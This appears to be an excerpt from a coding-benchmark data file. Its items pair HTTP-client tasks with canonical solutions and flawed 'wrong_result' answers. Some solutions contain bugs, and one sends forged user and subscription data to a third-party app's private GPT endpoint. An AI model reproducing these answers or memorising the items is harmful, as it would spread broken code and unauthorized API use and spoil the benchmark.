\"https://api.github.com/user/emails\",\n                headers={\"Authorization\": f\"Bearer {self.access_token}\"},\n            )\n            email_data = email_response.json()\n            primary_email = next(\n                email[\"email\"] for email in email_data if email[\"primary\"]\n            )\n            return {\n                \"email\": primary_email,\n                \"first_name\": (\n                    data.get(\"name\", \"\").split()[0] if data.get(\"name\") else \"\"\n                ),\n                \"last_name\": (\n                    data.get(\"name\", \"\").split()[-1] if data.get(\"name\") else \"\"\n                ),\n            }\n        except Exception as e:\n            raise HTTPException(\n                status_code=400,\n                detail=\"Error getting user info from GitHub\",\n            )",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom requests.exceptions import HTTPError\n\nclass GitHubSSO:\n    def __init__(self, client_id, client_secret, refresh_token):\n        self.client_id = client_id\n        self.client_secret = client_secret\n        self.refresh_token = refresh_token\n        self.access_token = None\n        self.user_info = {}\n\n    def get_new_token(self):\n        url = \"https://github.com/login/oauth/access_token\"\n        payload = {\n            'client_id': self.client_id,\n            'client_secret': self.client_secret,\n            'refresh_token': self.refresh_token,\n            'grant_type': 'refresh_token'\n        }\n        headers = {'Accept': 'application/json'}\n        response = requests.post(url, data=payload, headers=headers)\n        response.raise_for_status()\n        self.access_token = response.json().get('access_token')\n        return self.access_token\n\n    def get_user_info(self):\n        if not self.access_token:\n            self.get_new_token()\n\n        url = \"https://api.github.com/user\"\n        headers = {'Authorization': f'token {self.access_token}'}\n        response = requests.get(url, headers=headers)\n        response.raise_for_status()\n        user_data = response.json()\n\n        self.user_info = {\n            \"email\": user_data.get('email', ''),\n            \"first_name\": user_data.get('name', '').split()[0] if 'name' in user_data else '',\n            \"last_name\": user_data.get('name', '').split()[1] if len(user_data.get('name', '').split()) > 1 else ''\n        }\n\n        return self.user_info\n```"
  },
  {
    "Task_id": 79,
    "Instruction": "Task Description: Create a Python class that implements HTTP client functionality for interacting with the RunKeeper API, including rate limiting, authorization handling, and standard HTTP methods (GET, POST, DELETE).\n\nClass Description: The RunKeeperAPI class provides methods to interact with the RunKeeper web service API. It handles rate limiting, authorization, and provides wrapper methods for common HTTP operations. The class includes rate limit tracking and proper error handling for API responses.\n\nAttributes:\n_RATE_LIMIT_KEY: str - Redis key used for tracking global rate limit status\n\nMethods:\n_rate_limit: [Name](endpoint: str, req_lambda: Callable) -> requests.Response - Handles rate limiting logic by checking Redis for existing rate limits and processing API responses for rate limit errors\n_api_headers: [Name](service_record: object) -> dict - Generates authorization headers for API requests using the service record's token\nget_request: [Name](url: str, service_record: object) -> dict - Performs an HTTP GET request to the specified URL with authorization headers and returns parsed JSON response\npost_request: [Name](url: str, service_record: object, data: Optional[dict]) -> requests.Response - Performs an HTTP POST request to the specified URL with optional data and authorization headers\ndelete_request: [Name](url: str, service_record: object) -> requests.Response - Performs an HTTP DELETE request to the specified URL with authorization headers\noauth_token_request: [Name](params: dict) -> str - Handles OAuth token requests by posting to the RunKeeper token endpoint and returns the access token",
    "Canonical_solution": "from tapiriik.settings import WEB_ROOT, RUNKEEPER_CLIENT_ID, RUNKEEPER_CLIENT_SECRET\nfrom tapiriik.services.api import APIException, UserException, UserExceptionType\nimport requests\nimport urllib.parse\nimport json\nfrom datetime import timedelta\nimport re\n\nclass RunKeeperAPI:\n    _RATE_LIMIT_KEY = \"rk:rate_limit:hit\"\n\n    def _rate_limit(self, endpoint, req_lambda):\n        if redis.get(self._RATE_LIMIT_KEY) is not None:\n            raise APIException(\"RK global rate limit previously reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n        response = req_lambda()\n        if response.status_code == 429:\n            if \"user\" not in response.text:\n                timeout = timedelta(minutes=15)\n                timeout_match = re.search(r\"(\\d+) (second|minute|hour|day)\", response.text)\n                if timeout_match:\n                    timeout = timedelta(**{\"%ss\" % timeout_match.group(2): float(timeout_match.group(1))}\n                redis.setex(self._RATE_LIMIT_KEY, response.text, timeout)\n                raise APIException(\"RK global rate limit reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n            else:\n                raise APIException(\"RK user rate limit reached on %s\" % endpoint, user_exception=UserException(UserExceptionType.RateLimited))\n        return response\n\n    def _api_headers(self, service_record):\n        return {\"Authorization\": \"Bearer \" + service_record.Authorization[\"Token\"],\n                \"Accept-Charset\": \"UTF-8\"}\n\n    def get_request(self, url, service_record):\n        response = self._rate_limit(\"get_request\",\n                                  lambda: requests.get(url,\n                                                      headers=self._api_headers(service_record)))\n        if response.status_code != 200:\n            if response.status_code in [401, 403]:\n                raise APIException(\"No authorization\", block=True, user_exception=UserException(UserExceptionType.Authorization, intervention_required=True))\n            raise APIException(\"Request failed: %s %s\" % (response.status_code, response.text))\n        return response.json()\n\n    def post_request(self, url, service_record, data=None):\n        response = self._rate_limit(\"post_request\",\n                                  lambda: requests.post(url,\n                                                       headers=self._api_headers(service_record),\n                                                       data=data))\n        response.raise_for_status()\n        return response\n\n    def delete_request(self, url, service_record):\n        response = self._rate_limit(\"delete_request\",\n                                  lambda: requests.delete(url,\n                                                         headers=self._api_headers(service_record)))\n        response.raise_for_status()\n        return response\n\n    def oauth_token_request(self, params):\n        response = self._rate_limit(\"auth_token\",\n                                  lambda: requests.post(\"https://runkeeper.com/apps/token\",\n                                                      data=urllib.parse.urlencode(params),\n                                                      headers={\"Content-Type\": \"application/x-www-form-urlencoded\"}))\n        if response.status_code != 200:\n            raise APIException(\"Invalid code\")\n        return response.json()[\"access_token\"]",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nfrom typing import Callable, Optional, Dict\nimport redis\n\nclass RunKeeperAPI:\n    _RATE_LIMIT_KEY = \"runkeeper_rate_limit\"\n\n    def __init__(self, redis_client: redis.Redis):\n        self.redis_client = redis_client\n\n    def _rate_limit(self, endpoint: str, req_lambda: Callable) -> requests.Response:\n        # Check rate limit in Redis\n        rate_limit_info = self.redis_client.get(self._RATE_LIMIT_KEY)\n        if rate_limit_info:\n            # Implement rate limiting logic here\n            pass\n\n        response = req_lambda()\n        if response.status_code == 429:\n            # Handle rate limit exceeded\n            self.redis_client.setex(self._RATE_LIMIT_KEY, 3600, \"rate_limited\")\n            raise Exception(\"Rate limit exceeded\")\n\n        return response\n\n    def _api_headers(self, service_record: object) -> Dict[str, str]:\n        return {\n            \"Authorization\": f\"Bearer {service_record.token}\",\n            \"Content-Type\": \"application/json\"\n        }\n\n    def get_request(self, url: str, service_record: object) -> Dict:\n        headers = self._api_headers(service_record)\n        response = self._rate_limit(url, lambda: requests.get(url, headers=headers))\n        response.raise_for_status()\n        return response.json()\n\n    def post_request(self, url: str, service_record: object, data: Optional[Dict] = None) -> requests.Response:\n        headers = self._api_headers(service_record)\n        response = self._rate_limit(url, lambda: requests.post(url, headers=headers, json=data))\n        response.raise_for_status()\n        return response\n\n    def delete_request(self, url: str, service_record: object) -> requests.Response:\n        headers = self._api_headers(service_record)\n        response = self._rate_limit(url, lambda: requests.delete(url, headers=headers))\n        response.raise_for_status()\n        return response\n\n    def oauth_token_request(self, params: Dict) -> str:\n        response = requests.post(\"https://runkeeper.com/apps/token\", data=params)\n        response.raise_for_status()\n        return response.json().get(\"access_token\")\n```"
  },
  {
    "Task_id": 8,
    "Instruction": "Task Description: Create a Python class that manages JavaScript libraries and CSS files, loading their contents from remote URLs via HTTP/HTTPS and storing them for later use.\n\nClass Description: The `Javascript` class handles the loading and storage of JavaScript libraries and CSS files from remote sources. It provides functionality to initialize with URLs, normalize them into lists, and fetch their contents over HTTP/HTTPS connections.\n\nAttributes:\n- lib: [Sequence[str]] - List of URLs pointing to JavaScript libraries to be loaded\n- css: [Sequence[str]] - List of URLs pointing to CSS files to be loaded\n- data: [str] - Additional inline JavaScript code\n- javascript_contents: [dict[str, str]] - Dictionary mapping library URLs to their loaded content\n\nMethods:\n- __init__(data: Optional[str] = None, lib: Optional[Union[str, Sequence]] = None, css: Optional[Union[str, Sequence]] = None) -> None - Initializes the class instance, normalizing input parameters into lists\n- load_javascript_contents() -> Javascript - Loads the contents of all JavaScript libraries specified in lib attribute via HTTP/HTTPS, stores them in javascript_contents, and returns self for method chaining",
    "Canonical_solution": "from ..types import Optional, Sequence, Union\nfrom urllib.parse import urlparse\nimport http.client\n\nclass Javascript:\n    def __init__(\n        self,\n        data: Optional[str] = None,\n        lib: Optional[Union[str, Sequence]] = None,\n        css: Optional[Union[str, Sequence]] = None,\n    ):\n        if isinstance(lib, str):\n            lib = [lib]\n        elif lib is None:\n            lib = []\n        if isinstance(css, str):\n            css = [css]\n        elif css is None:\n            css = []\n        self.lib = lib\n        self.css = css\n        self.data = data or \"\"\n        self.javascript_contents = dict()\n\n    def load_javascript_contents(self):\n        for lib in self.lib:\n            parsed_url = urlparse(lib)\n            host: str = str(parsed_url.hostname)\n            port: int = parsed_url.port\n            path: str = parsed_url.path\n\n            resp: Optional[http.client.HTTPResponse] = None\n            try:\n                conn = http.client.HTTPSConnection(host, port)\n                conn.request(\"GET\", path)\n                resp = conn.getresponse()\n                if resp.status != 200:\n                    raise RuntimeError(\"Cannot load JavaScript lib: %s\" % lib)\n                self.javascript_contents[lib] = resp.read().decode(\"utf-8\")\n            finally:\n                if resp is not None:\n                    resp.close()\n        return self",
    "Code_level": "Class-level",
    "FSMID_for_test": 56,
    "wrong_result": "```python\nfrom typing import Optional, Union, Sequence, Dict\nimport requests\n\nclass Javascript:\n    def __init__(self, data: Optional[str] = None, lib: Optional[Union[str, Sequence]] = None, css: Optional[Union[str, Sequence]] = None) -> None:\n        self.data = data\n        self.lib = [lib] if isinstance(lib, str) else lib if lib is not None else []\n        self.css = [css] if isinstance(css, str) else css if css is not None else []\n        self.javascript_contents: Dict[str, str] = {}\n\n    def load_javascript_contents(self) -> 'Javascript':\n        for url in self.lib:\n            try:\n                response = requests.get(url)\n                response.raise_for_status()\n                self.javascript_contents[url] = response.text\n            except requests.RequestException as e:\n                print(f\"Failed to load {url}: {e}\")\n        return self\n```"
  },
  {
    "Task_id": 80,
    "Instruction": "Task Description: Create a Python function to interact with Gitee's API to create a new release and upload a file to that release.\n\nFunction Description: This function performs two main operations: 1) Creates a new release in a specified Gitee repository using OAuth authentication, and 2) Uploads a specified file to the created release. The function handles authentication, API requests, and response processing.\n\nInput:\n- owner (str): The owner of the Gitee repository\n- repo (str): The name of the Gitee repository\n- tag (str): The tag name for the new release\n- file_path (str): Path to the file to be uploaded (default: \"Seraphine.7z\")\n\nOutput:\n- dict: A dictionary containing:\n  - release_id (str): The ID of the created release\n  - download_url (str): The download URL of the uploaded file\n\nNote: The function requires the following environment variables to be set:\n- GITEE_OWNER\n- GITEE_REPO\n- GITEE_USERNAME\n- GITEE_PASSWORD\n- GITEE_CLIENT_ID\n- GITEE_CLIENT_SECRET",
    "Canonical_solution": "import argparse\nimport os\nimport requests\n\nGITEE_OWNER = os.environ[\"GITEE_OWNER\"]\nGITEE_REPO = os.environ[\"GITEE_REPO\"]\nGITEE_USERNAME = os.environ[\"GITEE_USERNAME\"]\nGITEE_PASSWORD = os.environ[\"GITEE_PASSWORD\"]\nGITEE_CLIENT_ID = os.environ[\"GITEE_CLIENT_ID\"]\nGITEE_CLIENT_SECRET = os.environ[\"GITEE_CLIENT_SECRET\"]\n\ndef create_new_release(owner, repo):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    TAG_NAME = args.tag\n    NAME = TAG_NAME\n    BODY = f\"Seraphine {TAG_NAME}\"\n    TARGET_COMMITISH = \"master\"\n\n    url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    data = {\n        \"tag_name\": TAG_NAME,\n        \"name\": NAME,\n        \"body\": BODY,\n        \"target_commitish\": TARGET_COMMITISH,\n    }\n    response = requests.post(url, data=data, headers=HEADERS, timeout=30)\n    if 200 <= response.status_code < 300:\n        return response.json()[\"id\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"create release on gitee failed.\")\n\ndef upload_file(onwer, repo, release_id):\n    ACCESS_TOKEN = requests.post(\n        \"https://gitee.com/oauth/token\",\n        data={\n            \"grant_type\": \"password\",\n            \"username\": GITEE_USERNAME,\n            \"password\": GITEE_PASSWORD,\n            \"client_id\": GITEE_CLIENT_ID,\n            \"client_secret\": GITEE_CLIENT_SECRET,\n            \"scope\": \"projects\",\n        },\n    ).json()[\"access_token\"]\n\n    HEADERS = {\"Authorization\": f\"Bearer {ACCESS_TOKEN}\"}\n    FILE_PATH = \"Seraphine.7z\"\n\n    url = f\"https://gitee.com/api/v5/repos/{onwer}/{repo}/releases/{release_id}/attach_files\"\n    files = {\"file\": open(FILE_PATH, \"rb\")}\n    response = requests.post(url, files=files, headers=HEADERS, timeout=30)\n\n    if 200 <= response.status_code < 300:\n        return response.json()[\"browser_download_url\"]\n    else:\n        print(response.json())\n        raise requests.HTTPError(\"push release file to Gitee failed.\")",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\nfrom requests.auth import HTTPBasicAuth\n\ndef create_release_and_upload_file(owner, repo, tag, file_path=\"Seraphine.7z\"):\n    gitee_owner = os.getenv(\"GITEE_OWNER\")\n    gitee_repo = os.getenv(\"GITEE_REPO\")\n    gitee_username = os.getenv(\"GITEE_USERNAME\")\n    gitee_password = os.getenv(\"GITEE_PASSWORD\")\n    gitee_client_id = os.getenv(\"GITEE_CLIENT_ID\")\n    gitee_client_secret = os.getenv(\"GITEE_CLIENT_SECRET\")\n\n    if not all([gitee_owner, gitee_repo, gitee_username, gitee_password, gitee_client_id, gitee_client_secret]):\n        raise ValueError(\"Missing required environment variables\")\n\n    # Step 1: Create a new release\n    auth = HTTPBasicAuth(gitee_username, gitee_password)\n    url = f\"https://gitee.com/api/v5/repos/{owner}/{repo}/releases\"\n    data = {\n        \"tag_name\": tag,\n        \"target_commitish\": \"master\",\n        \"name\": tag,\n        \"body\": \"Release notes for version {}\".format(tag),\n        \"draft\": False,\n        \"prerelease\": False\n    }\n    response = requests.post(url, json=data, auth=auth)\n    response.raise_for_status()\n    release_data = response.json()\n    release_id = release_data['id']\n\n    # Step 2: Upload a file to the created release\n    upload_url = f\"https://uploads.gitee.com/api/v5/repos/{owner}/{repo}/releases/{release_id}/assets?access_token={gitee_client_secret}\"\n    files = {'file': open(file_path, 'rb')}\n    upload_response = requests.post(upload_url, files=files)\n    upload_response.raise_for_status()\n    upload_data = upload_response.json()\n    download_url = upload_data['browser_download_url']\n\n    return {\n        \"release_id\": str(release_id),\n        \"download_url\": download_url\n    }\n```"
  },
  {
    "Task_id": 81,
    "Instruction": "Task Description: Create a Python class that interacts with a Loki logging system through HTTP and WebSocket connections, allowing for querying log ranges and tailing live logs.\n\nClass Description: The LokiClient class provides methods to query historical log data (query_range) and establish a WebSocket connection for live log tailing (create_tail_ws). The LokiTailWs class manages the WebSocket connection for live log streaming.\n\nAttributes:\n- query_range_url: str - Endpoint path for querying log ranges\n- tail_url: str - Endpoint path for tailing live logs\n- base_url: str - Base URL of the Loki server\n\nMethods:\n- __init__(base_url: str) -> None - Initializes the client with the Loki server's base URL\n- query_range(query: str, start: str, end: str, limit: int = 100) -> dict - Queries log data within a specified time range\n- create_tail_ws(query: str, limit: int = 100) -> LokiTailWs - Creates a WebSocket connection for live log tailing\n\nLokiTailWs Class Description: Manages a WebSocket connection for streaming live logs from Loki.\n\nAttributes:\n- _ws: WebSocket - The active WebSocket connection\n\nMethods:\n- __init__(ws: WebSocket) -> None - Initializes with an established WebSocket connection\n- messages() -> Generator - Yields incoming log messages from the WebSocket\n- close() -> None - Closes the WebSocket connection",
    "Canonical_solution": "import urllib.parse\nimport requests\nfrom websockets.sync.client import connect as ws_connect\n\nclass LokiClient:\n    query_range_url = '/loki/api/v1/query_range'\n    tail_url = '/loki/api/v1/tail'\n\n    def __init__(self, base_url: str):\n        self.base_url = base_url.rstrip('/')\n\n    def query_range(self, query, start, end, limit=100):\n        params = {\n            'query': query,\n            'start': start,\n            'end': end,\n            'limit': limit,\n        }\n        url = f\"{self.base_url}{self.query_range_url}\"\n        response = requests.get(url, params=params)\n        if response.status_code != 200:\n            raise Exception(response.text)\n        return response.json()\n\n    def create_tail_ws(self, query, limit=100):\n        data = {'query': query, 'limit': limit}\n        params = urllib.parse.urlencode(data)\n        ws_url = f\"ws://{self.base_url[7:]}\"\n        if self.base_url.startswith('https://'):\n            ws_url = f\"wss://{self.base_url[8:]}\"\n        url = f\"{ws_url}{self.tail_url}?{params}\"\n        ws = ws_connect(url)\n        return LokiTailWs(ws)\n\nclass LokiTailWs:\n    def __init__(self, ws):\n        self._ws = ws\n\n    def messages(self):\n        for message in self._ws:\n            yield message\n\n    def close(self):\n        if self._ws:\n            self._ws.close()",
    "Code_level": "Class-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport requests\nimport websocket\nfrom typing import Generator\n\nclass LokiClient:\n    def __init__(self, base_url: str) -> None:\n        self.base_url = base_url\n        self.query_range_url = f\"{base_url}/loki/api/v1/query_range\"\n        self.tail_url = f\"{base_url}/loki/api/v1/tail\"\n\n    def query_range(self, query: str, start: str, end: str, limit: int = 100) -> dict:\n        params = {\n            \"query\": query,\n            \"start\": start,\n            \"end\": end,\n            \"limit\": limit\n        }\n        response = requests.get(self.query_range_url, params=params)\n        return response.json()\n\n    def create_tail_ws(self, query: str, limit: int = 100) -> 'LokiTailWs':\n        params = {\n            \"query\": query,\n            \"limit\": limit\n        }\n        ws_url = f\"{self.tail_url}?{urlencode(params)}\"\n        ws = websocket.create_connection(ws_url)\n        return LokiTailWs(ws)\n\nclass LokiTailWs:\n    def __init__(self, ws: websocket.WebSocket) -> None:\n        self._ws = ws\n\n    def messages(self) -> Generator:\n        while True:\n            message = self._ws.recv()\n            yield message\n\n    def close(self) -> None:\n        self._ws.close()\n```"
  },
  {
    "Task_id": 87,
    "Instruction": "Task Description: Implement a Python function to download a file from a given URL and cache it locally, with progress tracking and ETag-based caching.\n\nFunction Description: The function should download a file from a specified URL to a local cache directory, using ETag headers for cache validation. It should show download progress and handle temporary files during download. If the file already exists in cache (verified by ETag), it should skip downloading.\n\nInput:\n- url: str - The URL of the file to download\n- cache_dir: Optional[str] - (Optional) Directory path for caching downloaded files. Defaults to DATASET_CACHE if None.\n\nOutput:\n- str - Returns the local file path where the downloaded content is cached\n\nNote: The function should:\n1. Create cache directory if it doesn't exist\n2. Check file existence using HEAD request and ETag\n3. Download with progress bar if not in cache\n4. Store metadata (URL and ETag) alongside cached file\n5. Handle temporary files safely during download\n6. Return final cache path",
    "Canonical_solution": "import os\nimport requests\nimport tempfile\nimport shutil\nimport json\nfrom tqdm import tqdm\n\nCACHE_ROOT = Path(os.getenv(\"SCISPACY_CACHE\", str(Path.home() / \".scispacy\")))\nDATASET_CACHE = str(CACHE_ROOT / \"datasets\")\n\ndef http_get(url: str, temp_file: IO) -> None:\n    req = requests.get(url, stream=True)\n    total = int(req.headers.get(\"content-length\", 0))\n    pbar = tqdm(total=total, unit=\"iB\", unit_scale=True, unit_divisor=1024)\n    for chunk in req.iter_content(chunk_size=1024):\n        if chunk:  # filter out keep-alive new chunks\n            size = temp_file.write(chunk)\n            pbar.update(size)\n    pbar.close()\n\ndef get_from_cache(url: str, cache_dir: Optional[str] = None) -> str:\n    if cache_dir is None:\n        cache_dir = DATASET_CACHE\n\n    os.makedirs(cache_dir, exist_ok=True)\n\n    response = requests.head(url, allow_redirects=True)\n    if response.status_code != 200:\n        raise IOError(\n            \"HEAD request failed for url {} with status code {}\".format(\n                url, response.status_code\n            )\n        )\n    etag = response.headers.get(\"ETag\")\n\n    filename = url_to_filename(url, etag)\n\n    cache_path = os.path.join(cache_dir, filename)\n\n    if not os.path.exists(cache_path):\n        with tempfile.NamedTemporaryFile() as temp_file:\n            print(f\"{url} not found in cache, downloading to {temp_file.name}\")\n\n            http_get(url, temp_file)\n\n            temp_file.flush()\n            temp_file.seek(0)\n\n            print(f\"Finished download, copying {temp_file.name} to cache at {cache_path}\")\n            with open(cache_path, \"wb\") as cache_file:\n                shutil.copyfileobj(temp_file, cache_file)\n\n            meta = {\"url\": url, \"etag\": etag}\n            meta_path = cache_path + \".json\"\n            with open(meta_path, \"w\") as meta_file:\n                json.dump(meta, meta_file)\n\n    return cache_path",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport os\nimport requests\nfrom urllib.parse import urlparse\nfrom tempfile import NamedTemporaryFile\nfrom tqdm import tqdm\n\nDATASET_CACHE = \"dataset_cache\"\n\ndef download_file(url, cache_dir=None):\n    if cache_dir is None:\n        cache_dir = DATASET_CACHE\n\n    if not os.path.exists(cache_dir):\n        os.makedirs(cache_dir)\n\n    parsed_url = urlparse(url)\n    filename = os.path.basename(parsed_url.path)\n    cache_path = os.path.join(cache_dir, filename)\n    metadata_path = cache_path + \".meta\"\n\n    if os.path.exists(cache_path) and os.path.exists(metadata_path):\n        with open(metadata_path, 'r') as meta_file:\n            stored_etag = meta_file.readline().strip()\n            stored_url = meta_file.readline().strip()\n\n        if stored_url == url:\n            response = requests.head(url)\n            if 'ETag' in response.headers and response.headers['ETag'] == stored_etag:\n                return cache_path\n\n    response = requests.get(url, stream=True)\n    total_size = int(response.headers.get('content-length', 0))\n\n    with NamedTemporaryFile(delete=False) as temp_file:\n        with tqdm(total=total_size, unit='B', unit_scale=True, desc=filename) as pbar:\n            for data in response.iter_content(1024):\n                size = temp_file.write(data)\n                pbar.update(size)\n\n    os.replace(temp_file.name, cache_path)\n\n    with open(metadata_path, 'w') as meta_file:\n        meta_file.write(response.headers.get('ETag', '') + '\\n')\n        meta_file.write(url + '\\n')\n\n    return cache_path\n```"
  },
  {
    "Task_id": 88,
    "Instruction": "Task Description: Create a function that queries DNS information from both Google and Cloudflare DNS APIs for a given domain and record type, handling potential errors gracefully.\n\nFunction Description: The function makes parallel DNS queries to Google's and Cloudflare's DNS-over-HTTPS APIs, returning the responses in a list. It includes error handling for failed requests and invalid responses.\n\nInput:\n- domain (str): The domain name to query (e.g., \"example.com\")\n- record_type (str): The DNS record type to query (e.g., \"A\", \"AAAA\", \"MX\")\n\nOutput:\n- list: A list containing two elements (Google's response first, then Cloudflare's), where each element is either:\n  - A dictionary containing the JSON response from the DNS API\n  - None if the request failed or returned non-200 status code",
    "Canonical_solution": "import requests\n\ndef make_dns_request(domain, record_type):\n    \"\"\"\n    Makes DNS requests to both Google and Cloudflare DNS APIs.\n\n    Args:\n        domain (str): The domain to query.\n        record_type (str): The type of DNS record to query.\n\n    Returns:\n        list: A list containing the JSON responses from Google and Cloudflare.\n    \"\"\"\n    urls = [\n        f\"https://dns.google/resolve?name={domain}&type={record_type}\",\n        f\"https://cloudflare-dns.com/dns-query?name={domain}&type={record_type}\"\n    ]\n\n    headers = {\n        \"accept\": \"application/dns-json\"\n    }\n\n    responses = []\n    for url in urls:\n        try:\n            response = requests.get(url, headers=headers)\n            if response.status_code == 200:\n                json_response = response.json()\n                responses.append(json_response)\n            else:\n                responses.append(None)\n        except Exception as e:\n            print(f\"URL: {url}, DNS Exception: {e}\")\n            responses.append(None)\n\n    return responses",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "```python\nimport asyncio\nimport aiohttp\n\nasync def query_dns(domain, record_type):\n    async def fetch(session, url):\n        try:\n            async with session.get(url) as response:\n                if response.status == 200:\n                    return await response.json()\n                else:\n                    return None\n        except Exception:\n            return None\n\n    google_url = f\"https://dns.google/resolve?name={domain}&type={record_type}\"\n    cloudflare_url = f\"https://cloudflare-dns.com/dns-query?name={domain}&type={record_type}\"\n\n    async with aiohttp.ClientSession() as session:\n        google_response = await fetch(session, google_url)\n        cloudflare_response = await fetch(session, cloudflare_url)\n\n    return [google_response, cloudflare_response]\n\n# Example usage:\n# loop = asyncio.get_event_loop()\n# result = loop.run_until_complete(query_dns(\"example.com\", \"A\"))\n# print(result)\n```"
  },
  {
    "Task_id": 89,
    "Instruction": "Task Description: Create a Python function that interacts with a GPT API endpoint to generate completions based on given messages, handling the HTTP request and response process.\n\nFunction Description: The function `_create_completion` sends a POST request to a specified GPT API endpoint with formatted messages and randomly generated user data. It processes the response to extract and yield the assistant's message content if the request is successful.\n\nInput:\n- model: str - The GPT model to use (e.g., 'gpt-3.5-turbo')\n- messages: list - A list of message dictionaries, each containing 'role' and 'content' keys\n- stream: bool - A flag indicating whether to stream the response (not used in this implementation)\n- **kwargs: Additional optional arguments\n\nOutput:\n- Generator[str, None, None] - Yields the assistant's message content if the request is successful\n- None - Returns None if an error occurs during the request",
    "Canonical_solution": "import os\nimport requests\nimport json\nimport random\nimport time\nimport string\nfrom ...typing import sha256, Dict, get_type_hints\n\nurl = \"https://wewordle.org/gptapi/v1/android/turbo\"\nmodel = ['gpt-3.5-turbo']\nsupports_stream = False\nneeds_auth = False\n\ndef _create_completion(model: str, messages: list, stream: bool, **kwargs):\n    base = ''\n    for message in messages:\n        base += '%s: %s\\n' % (message['role'], message['content'])\n    base += 'assistant:'\n    _user_id = ''.join(random.choices(\n        f'{string.ascii_lowercase}{string.digits}', k=16))\n    _app_id = ''.join(random.choices(\n        f'{string.ascii_lowercase}{string.digits}', k=31))\n    _request_date = time.strftime(\"%Y-%m-%dT%H:%M:%S.000Z\", time.gmtime())\n    headers = {\n        'accept': '*/*',\n        'pragma': 'no-cache',\n        'Content-Type': 'application/json',\n        'Connection': 'keep-alive'\n    }\n    data = {\n        \"user\": _user_id,\n        \"messages\": [\n            {\"role\": \"user\", \"content\": base}\n        ],\n        \"subscriber\": {\n            \"originalPurchaseDate\": None,\n            \"originalApplicationVersion\": None,\n            \"allPurchaseDatesMillis\": {},\n            \"entitlements\": {\n                \"active\": {},\n                \"all\": {}\n            },\n            \"allPurchaseDates\": {},\n            \"allExpirationDatesMillis\": {},\n            \"allExpirationDates\": {},\n            \"originalAppUserId\": f\"$RCAnonymousID:{_app_id}\",\n            \"latestExpirationDate\": None,\n            \"requestDate\": _request_date,\n            \"latestExpirationDateMillis\": None,\n            \"nonSubscriptionTransactions\": [],\n            \"originalPurchaseDateMillis\": None,\n            \"managementURL\": None,\n            \"allPurchasedProductIdentifiers\": [],\n            \"firstSeen\": _request_date,\n            \"activeSubscriptions\": []\n        }\n    }\n    response = requests.post(url, headers=headers, data=json.dumps(data))\n    if response.status_code == 200:\n        _json = response.json()\n        if 'message' in _json:\n            message_content = _json['message']['content']\n            message_content = message_content.replace('**assistant:** ', '')\n            yield message_content\n    else:\n        print(f\"Error Occurred::{response.status_code}\")\n        return None",
    "Code_level": "Function-level",
    "FSMID_for_test": 57,
    "wrong_result": "import requests\nimport random\nimport string\n\ndef _create_completion(model, messages, stream=False, **kwargs):\n    api_url = \"https://api.openai.com/v1/chat/completions\"\n    headers = {\n        \"Content-Type\": \"application/json\",\n        \"Authorization\": f\"Bearer {kwargs.get('api_key')}\"\n    }\n    payload = {\n        \"model\": model,\n        \"messages\": messages,\n        \"stream\": stream\n    }\n    \n    try:\n        response = requests.post(api_url, headers=headers, json=payload)\n        response.raise_for_status()\n        response_data = response.json()\n        \n        for choice in response_data.get(\"choices\", []):\n            message = choice.get(\"message\")\n            if message and message.get(\"role\") == \"assistant\":\n                yield message.get(\"content\", \"\")\n    \n    except requests.RequestException as e:\n        print(f\"An error occurred: {e}\")\n        return None\n\n# Example usage:\n# api_key = \"your_api_key_here\"\n# messages = [{\"role\": \"user\", \"content\": \"Hello!\"}]\n# for completion in _create_completion(\"gpt-3.5-turbo\", messages, api_key=api_key):\n#     print(completion)"
  },
  {
    "Task_id": 91,
    "Instruction": "Task Description: Create a Python class to interact with the Cal.com API for managing bookings, available time slots, and timezone conversions.\n\nClass Description: The CalComAPI class provides methods to interact with Cal.com's API v2 for scheduling operations. It handles authentication, timezone conversions, and provides functionality to check available slots, create/reschedule/cancel bookings, and view upcoming bookings.\n\nAttributes:\napi_key: str - The API key for authenticating with Cal.com's API\nevent_type_id: int - The event type ID for which bookings are managed\nuser_timezone: str - The timezone to display times to users (default: \"America/New_York\")\n\nMethods:\n_convert_to_user_timezone(utc_time: str) -> str - Converts UTC time string to user's local timezone\n_get_headers(api_version: str = \"2024-08-13\") -> Dict[str, str] - Returns authorization headers for API requests\nget_available_slots(start_date: str, end_date: str) -> str - Retrieves available booking slots between dates\ncreate_booking(start_time: str, name: str, email: str) -> str - Creates a new booking with attendee details\nget_upcoming_bookings(email: str) -> str - Retrieves upcoming bookings for an attendee\nreschedule_booking(booking_uid: str, new_start_time: str, reason: str) -> str - Reschedules an existing booking\ncancel_booking(booking_uid: str, reason: str) -> str - Cancels an existing booking",
